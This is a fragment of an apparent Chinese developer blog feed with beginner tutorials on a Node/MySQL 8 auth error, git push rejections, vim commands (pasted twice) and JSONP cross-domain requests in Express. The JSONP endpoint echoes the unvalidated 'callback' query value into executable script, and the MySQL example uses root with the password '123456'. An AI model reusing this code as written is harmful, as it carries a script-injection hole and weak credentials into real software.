class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;运行在http://127.0.0.1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先，先了解一下关于http协议里定义的四种常见数据的post方法，分别是：&lt;br&gt;application/www-form-ulrencoded&lt;br&gt;multipart/form-data&lt;br&gt;application/json&lt;br&gt;text/xml&lt;/p&gt;
&lt;p&gt;E</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    
  </entry>
  
  <entry>
    <title>node连接MySql报错ER_NOT_SUPPORTED_AUTH_MODE</title>
    <link href="https://coloey.github.io/2022/03/20/node%E8%BF%9E%E6%8E%A5MySql%E6%8A%A5%E9%94%99ER-NOT-SUPPORTED-AUTH-MODE/"/>
    <id>https://coloey.github.io/2022/03/20/node%E8%BF%9E%E6%8E%A5MySql%E6%8A%A5%E9%94%99ER-NOT-SUPPORTED-AUTH-MODE/</id>
    <published>2022-03-20T05:28:16.000Z</published>
    <updated>2022-03-20T05:33:56.881Z</updated>
    
    <content type="html"><![CDATA[<h1 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h1><p>本人系统安装的是mysql-installer-community-8.0.18.0.msi这个版本，然后我本地使用node-mysql去连接数据库。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql=<span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="comment">//建立MYSQL与数据库的联系</span></span><br><span class="line"><span class="keyword">const</span> db=mysql.createPool(&#123;</span><br><span class="line">    <span class="attr">host</span>:<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="comment">//数据库的ip地址</span></span><br><span class="line">    <span class="attr">user</span>:<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>:<span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    <span class="attr">database</span>:<span class="string">&#x27;my_db_01&#x27;</span>,<span class="comment">//指定要操作哪个数据库</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//测试mysql能否正常工作</span></span><br><span class="line">db.query(<span class="string">&#x27;select 1&#x27;</span>,<span class="function">(<span class="params">err,result</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//mysql工作期间报错</span></span><br><span class="line">    <span class="keyword">if</span>(err)<span class="keyword">return</span> <span class="built_in">console</span>.log(err.message)</span><br><span class="line">    <span class="comment">//能成功执行SQL语句</span></span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>运行db.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Vue-chat\Server&gt; node db.js</span><br><span class="line">ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client</span><br></pre></td></tr></table></figure><h1 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h1><p>mysql8.0以上加密方式，Node还不支持。</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>第一步谷歌<br>查到了 <a href="https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server">https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server</a><br>这个答案，和我报错的步骤基本一样，按照这个进行操作，登录MySql Command Line Client使用这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;123456&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.27 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.08 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;报错信息&quot;&gt;&lt;a href=&quot;#报错信息&quot; class=&quot;headerlink&quot; title=&quot;报错信息&quot;&gt;&lt;/a&gt;报错信息&lt;/h1&gt;&lt;p&gt;本人系统安装的是mysql-installer-community-8.0.18.0.msi这个版本，然后我本地使用node</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    
  </entry>
  
  <entry>
    <title>git遇到的坑</title>
    <link href="https://coloey.github.io/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
    <id>https://coloey.github.io/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</id>
    <published>2022-03-18T13:44:59.000Z</published>
    <updated>2022-03-18T13:45:30.601Z</updated>
    
    <content type="html"><![CDATA[<p>解决用git push origin master时出现的问题<br>不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下</p><p>报错内容：<br>To github.com:<em><strong>/</strong></em><br>! [rejected] master -&gt; master (non-fast-forward)<br>error: failed to push some refs to ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;</a>:***/***’<br>hint: Updates were rejected because the tip of your current branch is behind<br>hint: its remote counterpart. Integrate the remote changes (e.g.<br>hint: ‘git pull …’) before pushing again.<br>hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details.</p><p>大致翻译为：<br>错误：无法将一些引用推送到’<a href="mailto:&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;</a>：****** / Demo.git’<br>提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。</p><p>这个报错的原因是因为远程repository和本地的repository有冲突，下面有3种解决办法：</p><p>按上面报错内容中所给的提示先用git pull之后再用git push<br>$ git pull origin master<br>$ git push origin master</p><p>使用强制push的方法，但是这会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候<br>$ git push origin master -f</p><p>如果不想merge远程和本地修改，可以先创建新的分支，然后再push<br>$ git branch [name]<br>$ git push origin [name]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;解决用git push origin master时出现的问题&lt;br&gt;不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下&lt;/p&gt;
&lt;p&gt;报错内容：&lt;br&gt;To github.com:&lt;em</summary>
      
    
    
    
    <category term="git" scheme="https://coloey.github.io/categories/git/"/>
    
    
  </entry>
  
  <entry>
    <title>vim</title>
    <link href="https://coloey.github.io/2022/03/18/vim/"/>
    <id>https://coloey.github.io/2022/03/18/vim/</id>
    <published>2022-03-18T13:42:38.000Z</published>
    <updated>2022-03-18T13:43:36.735Z</updated>
    
    <content type="html"><![CDATA[<p>Vim可以分为三种模式，分别为：</p><blockquote><p>命令行模式（Command mode）</p><p>插入模式（Insert mode）</p><p>底行模式（Lastline mode）</p></blockquote><p><strong>命令行模式</strong></p><blockquote><p>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p></blockquote><p><strong>插入模式</strong></p><blockquote><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p></blockquote><p><strong>底行模式</strong></p><blockquote><p>将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。</p></blockquote><p><strong>不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。</strong></p><hr><h4 id="5-Vim的基本操作"><a href="#5-Vim的基本操作" class="headerlink" title="5. Vim的基本操作"></a>5. Vim的基本操作</h4><p><strong>a) 进入Vim</strong></p><p>在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。</p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-bd8c3655e34df86f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/734/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-7389372474e9c632.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/733/format/webp" alt="img"></p><blockquote><p>特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。</p></blockquote><p><strong>b) 切换至插入模式（Insert mode）编辑文件</strong></p><p>在<strong>「命令行模式（command mode）」</strong>下<strong>按一下字母「i」就可以进入「插入模式（Insert mode）」</strong>，这时候你就可以开始输入文字了。</p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-a1a7aeded64e57f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/731/format/webp" alt="img"></p><p><strong>c) 插入模式（Insert mode）切换到命令行模式（Command mode）</strong></p><p>在插入模式下，按一下「ESC」键即可。</p><p><strong>d) 退出vim及保存文件</strong> </p><p>在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode）</p><p>常见底行模式下的命令行：</p><blockquote><p>:w filename 文件以filename为文件名保存</p><p>:wq 文件存盘并退出vim</p><p>:q 文件不存盘并退出vim</p><p>:q! 文件不存盘强制退出vim</p></blockquote><hr><h4 id="6-命令行模式下的功能键（部分）"><a href="#6-命令行模式下的功能键（部分）" class="headerlink" title="6. 命令行模式下的功能键（部分）"></a><strong>6. 命令行模式下的功能键（部分）</strong></h4><p><strong>a) 从命令行模式切换为插入模式的三种方式</strong></p><blockquote><p>「 i 」：从当前光标位置进入插入模式</p><p>「 a 」：从当前光标位置的下一个字符进入插入模式</p><p>「 o 」：从当前光标位置的下一行进入插入模式</p></blockquote><p><strong>b) 从插入模式切换为命令行模式</strong></p><blockquote><p>按「ESC」键 </p></blockquote><p><strong>c) 移动光标</strong></p><blockquote><p>vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。</p></blockquote><p><strong>d) 行尾追加</strong></p><blockquote><p>不管光标在该行的什么位置，直接按大写字母「A」即可</p></blockquote><p><strong>e) 删除单词</strong></p><blockquote><p>dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可</p><p>de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可</p></blockquote><p><strong>f) 从当前光标处删除到行末</strong></p><blockquote><p>把光标停留在需要删除的句子前面，依次按下「d」「$」，即可</p></blockquote><p><strong>g) 快速跳转到行首</strong></p><blockquote><p>按下数字「0」，即可</p></blockquote><p><strong>h) 使用计数以删除单词</strong></p><blockquote><p>示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up.</p><p>依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE</p><p>将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP</p><p>将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV</p><p>得到句子：</p><p>this line of words is cleaned up.</p></blockquote><p><strong>i) 删除当前行</strong></p><blockquote><p>鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。</p><p>连续删除两行，从当前行开始，则为：「2」「d」「d」</p></blockquote><p><strong>j) 撤销更改</strong></p><blockquote><p>a. 按小写字母「u」，撤销上一步的更改操作；</p><p>b. 按大写字母「U」，撤销整行的更改操作；</p><p>c. 「Ctrl+R」撤销上一步「撤销操作」。</p></blockquote><p><strong>k) 将刚删除的内容置入其他行</strong></p><blockquote><p>之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。</p><p>先在想删除的行，按「d」「d」，进行删除操作；</p><p>再在想插入那行的前一行按「p」键即可。</p></blockquote><p><strong>l) 替换</strong></p><blockquote><p>将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。</p></blockquote><p><strong>m) 跳转</strong></p><blockquote><p>顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可；</p><p>底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可；</p><p>特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。</p></blockquote><p><strong>n) 查找命令</strong></p><p>字符串查找：</p><blockquote><p>输入英文斜杠「/」，后面紧接需要搜索的字符串即可。</p><p>查找下一个相同字符串，就紧接着按小写字母「n」；</p><p>查找上一个相同字符串，就紧接着按大写字母「N」。</p></blockquote><p>配对括号查找：</p><blockquote><p>在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。</p></blockquote><p><strong>o) 替换字符串</strong></p><p>当前行替换命令</p><blockquote><p>在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。</p><p>完整语句为：</p><p><strong>:s/dogg/dog/g</strong></p></blockquote><p>特定几行替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p>**<em>*:*<em>5,8s/dogg/dog/g</em></em></p></blockquote><p>全文替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/g</strong></p></blockquote><p>全文替换命令（每个匹配项替换前需确认）</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/gc</strong></p></blockquote><p>作者：饥人谷_李维超<br>链接：<a href="https://www.jianshu.com/p/8b679b35c9d5">https://www.jianshu.com/p/8b679b35c9d5</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。Vim可以分为三种模式，分别为：</p><blockquote><p>命令行模式（Command mode）</p><p>插入模式（Insert mode）</p><p>底行模式（Lastline mode）</p></blockquote><p><strong>命令行模式</strong></p><blockquote><p>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p></blockquote><p><strong>插入模式</strong></p><blockquote><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p></blockquote><p><strong>底行模式</strong></p><blockquote><p>将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。</p></blockquote><p><strong>不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。</strong></p><hr><h4 id="5-Vim的基本操作-1"><a href="#5-Vim的基本操作-1" class="headerlink" title="5. Vim的基本操作"></a>5. Vim的基本操作</h4><p><strong>a) 进入Vim</strong></p><p>在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。</p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-bd8c3655e34df86f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/734/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-7389372474e9c632.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/733/format/webp" alt="img"></p><blockquote><p>特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。</p></blockquote><p><strong>b) 切换至插入模式（Insert mode）编辑文件</strong></p><p>在<strong>「命令行模式（command mode）」</strong>下<strong>按一下字母「i」就可以进入「插入模式（Insert mode）」</strong>，这时候你就可以开始输入文字了。</p><p><img src="https://upload-images.jianshu.io/upload_images/4496284-a1a7aeded64e57f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/731/format/webp" alt="img"></p><p><strong>c) 插入模式（Insert mode）切换到命令行模式（Command mode）</strong></p><p>在插入模式下，按一下「ESC」键即可。</p><p><strong>d) 退出vim及保存文件</strong> </p><p>在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode）</p><p>常见底行模式下的命令行：</p><blockquote><p>:w filename 文件以filename为文件名保存</p><p>:wq 文件存盘并退出vim</p><p>:q 文件不存盘并退出vim</p><p>:q! 文件不存盘强制退出vim</p></blockquote><hr><h4 id="6-命令行模式下的功能键（部分）-1"><a href="#6-命令行模式下的功能键（部分）-1" class="headerlink" title="6. 命令行模式下的功能键（部分）"></a><strong>6. 命令行模式下的功能键（部分）</strong></h4><p><strong>a) 从命令行模式切换为插入模式的三种方式</strong></p><blockquote><p>「 i 」：从当前光标位置进入插入模式</p><p>「 a 」：从当前光标位置的下一个字符进入插入模式</p><p>「 o 」：从当前光标位置的下一行进入插入模式</p></blockquote><p><strong>b) 从插入模式切换为命令行模式</strong></p><blockquote><p>按「ESC」键 </p></blockquote><p><strong>c) 移动光标</strong></p><blockquote><p>vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。</p></blockquote><p><strong>d) 行尾追加</strong></p><blockquote><p>不管光标在该行的什么位置，直接按大写字母「A」即可</p></blockquote><p><strong>e) 删除单词</strong></p><blockquote><p>dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可</p><p>de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可</p></blockquote><p><strong>f) 从当前光标处删除到行末</strong></p><blockquote><p>把光标停留在需要删除的句子前面，依次按下「d」「$」，即可</p></blockquote><p><strong>g) 快速跳转到行首</strong></p><blockquote><p>按下数字「0」，即可</p></blockquote><p><strong>h) 使用计数以删除单词</strong></p><blockquote><p>示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up.</p><p>依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE</p><p>将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP</p><p>将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV</p><p>得到句子：</p><p>this line of words is cleaned up.</p></blockquote><p><strong>i) 删除当前行</strong></p><blockquote><p>鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。</p><p>连续删除两行，从当前行开始，则为：「2」「d」「d」</p></blockquote><p><strong>j) 撤销更改</strong></p><blockquote><p>a. 按小写字母「u」，撤销上一步的更改操作；</p><p>b. 按大写字母「U」，撤销整行的更改操作；</p><p>c. 「Ctrl+R」撤销上一步「撤销操作」。</p></blockquote><p><strong>k) 将刚删除的内容置入其他行</strong></p><blockquote><p>之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。</p><p>先在想删除的行，按「d」「d」，进行删除操作；</p><p>再在想插入那行的前一行按「p」键即可。</p></blockquote><p><strong>l) 替换</strong></p><blockquote><p>将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。</p></blockquote><p><strong>m) 跳转</strong></p><blockquote><p>顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可；</p><p>底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可；</p><p>特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。</p></blockquote><p><strong>n) 查找命令</strong></p><p>字符串查找：</p><blockquote><p>输入英文斜杠「/」，后面紧接需要搜索的字符串即可。</p><p>查找下一个相同字符串，就紧接着按小写字母「n」；</p><p>查找上一个相同字符串，就紧接着按大写字母「N」。</p></blockquote><p>配对括号查找：</p><blockquote><p>在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。</p></blockquote><p><strong>o) 替换字符串</strong></p><p>当前行替换命令</p><blockquote><p>在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。</p><p>完整语句为：</p><p><strong>:s/dogg/dog/g</strong></p></blockquote><p>特定几行替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p>**<em>*:*<em>5,8s/dogg/dog/g</em></em></p></blockquote><p>全文替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/g</strong></p></blockquote><p>全文替换命令（每个匹配项替换前需确认）</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/gc</strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Vim可以分为三种模式，分别为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;命令行模式（Command mode）&lt;/p&gt;
&lt;p&gt;插入模式（Insert mode）&lt;/p&gt;
&lt;p&gt;底行模式（Lastline mode）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="vim" scheme="https://coloey.github.io/categories/vim/"/>
    
    
  </entry>
  
  <entry>
    <title>JSONP解决跨域问题</title>
    <link href="https://coloey.github.io/2022/03/14/JSONP%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/"/>
    <id>https://coloey.github.io/2022/03/14/JSONP%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/</id>
    <published>2022-03-14T09:46:33.000Z</published>
    <updated>2022-03-14T09:54:26.273Z</updated>
    
    <content type="html"><![CDATA[<p>概念：</p><p>浏览器通过<script>标签的src属性，请求服务器上的数据，同时服务器返回一个函数的调用，这种请求数据的方式·叫做JSONP</p><p>如果项目中已经配置了CORS跨域资源共享，为防止冲突,必须在配置CORS中间件之前声明JSONP的接口，否则JSONP接口会被处理成开启了CORS的接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express=<span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="comment">//创建web服务器</span></span><br><span class="line"><span class="keyword">const</span> app=express()</span><br><span class="line"><span class="comment">//导入路由模块</span></span><br><span class="line"><span class="keyword">const</span> apirouter=<span class="built_in">require</span>(<span class="string">&#x27;./apirouter&#x27;</span>)</span><br><span class="line"><span class="comment">//在配置cors中间件之前定义JSONP的接口</span></span><br><span class="line">app.get(<span class="string">&#x27;/api/jsonp&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//1 得到客户端请求的回调函数名称</span></span><br><span class="line">    <span class="keyword">const</span> funcName=req.query.callback</span><br><span class="line">    <span class="comment">//2 定义发送到客户端的JSON格式数据对象</span></span><br><span class="line">    <span class="keyword">const</span> data=&#123;<span class="attr">name</span>:<span class="string">&#x27;zs&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span><br><span class="line">    <span class="comment">//3 拼接一个函数调用的字符串</span></span><br><span class="line">    <span class="keyword">const</span> scriptStr=<span class="string">`<span class="subst">$&#123;funcName&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span></span><br><span class="line">    <span class="comment">//4 把拼接的字符串响应给客户端的&lt;script&gt;标签进行解析执行</span></span><br><span class="line">    res.send(scriptStr)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.use(express.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line"><span class="comment">//在路由之前配置cors中间件</span></span><br><span class="line"><span class="keyword">const</span> cors=<span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>)</span><br><span class="line">app.use(cors())</span><br><span class="line"></span><br><span class="line"><span class="comment">//将路由模块注册为全局中间件</span></span><br><span class="line">app.use(<span class="string">&#x27;/api&#x27;</span>,apirouter)</span><br><span class="line">app.listen(<span class="number">80</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;运行在http://127.0.0.1&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发请求：HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/jquery/1.10.0/jquery.min.js&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btnJsonp&quot;</span>&gt;</span>Jsonp<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        $(<span class="string">&#x27;#btnJsonp&#x27;</span>).on(<span class="string">&#x27;click&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/jsonp&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">dataType</span>:<span class="string">&#x27;jsonp&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(res)</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;)</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 